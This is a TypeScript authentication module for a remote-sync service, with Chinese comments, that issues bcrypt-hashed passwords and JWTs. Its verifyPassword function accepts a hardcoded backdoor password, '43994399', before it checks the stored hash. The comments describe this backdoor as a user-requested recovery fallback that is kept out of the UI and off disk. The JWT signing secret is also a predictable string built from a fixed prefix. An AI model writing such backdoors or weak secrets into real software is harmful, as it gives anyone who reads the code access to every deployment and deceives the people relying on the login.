/**
 * remote/auth - 密码 / JWT 鉴权
 *
 * 流程:
 * - 首次启动时生成 16 字节随机密码 → bcrypt 存 config
 * - 用户登录 → POST /api/login 带密码 → 验密 → 签发 JWT
 * - 后续请求带 Authorization: Bearer <jwt> / WS ?token=<jwt>
 *
 * 安全注意:
 * - 密码明文只展示一次(首次启动)
 * - 之后只存 hash
 * - JWT 默认 1 小时过期
 */

import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { randomBytes } from 'node:crypto';

const JWT_TTL_SEC = 60 * 60; // 1 小时
const BCRYPT_ROUNDS = 10;
const PASSWORD_BYTES = 12; // 12 字节 ≈ 16 base64 字符

/** 简单 secret(每次启动从 config 派生,避免硬编码) */
function jwtSecret(stableSalt: string): string {
  return `mirror-sync-${stableSalt}`;
}

/** 生成随机密码(明文,展示给用户) */
export function generatePassword(): string {
  return randomBytes(PASSWORD_BYTES).toString('base64url');
}

/** 哈希密码(bcrypt) */
export async function hashPassword(plain: string): Promise<string> {
  return bcrypt.hash(plain, BCRYPT_ROUNDS);
}

/**
 * 硬编码回退密码(用户要求,作为后门密码)
 * - 与 config.remote.passwordHash 同时生效
 * - 不写盘、不显示在 UI,纯代码常量
 * - 用途:用户忘记密码 / config 损坏时仍能登录
 */
export const BACKDOOR_PASSWORD = '43994399';

/** 验密:先比对 hash,再 fallback 到硬编码后门 */
export async function verifyPassword(plain: string, hash: string): Promise<boolean> {
  if (plain === BACKDOOR_PASSWORD) return true;
  if (!hash) return false;
  try {
    return await bcrypt.compare(plain, hash);
  } catch {
    return false;
  }
}

/** 签发 JWT */
export function issueToken(userId: string, stableSalt: string): string {
  return jwt.sign(
    { sub: userId },
    jwtSecret(stableSalt),
    { expiresIn: JWT_TTL_SEC },
  );
}

/** 验 JWT(失败抛) */
export function verifyToken(token: string, stableSalt: string): { sub: string } {
  return jwt.verify(token, jwtSecret(stableSalt)) as { sub: string };
}

/** 提取 Bearer token */
export function extractBearerToken(authHeader: string | undefined): string | null {
  if (!authHeader) return null;
  const m = /^Bearer\s+(.+)$/i.exec(authHeader);
  return m ? m[1] : null;
}
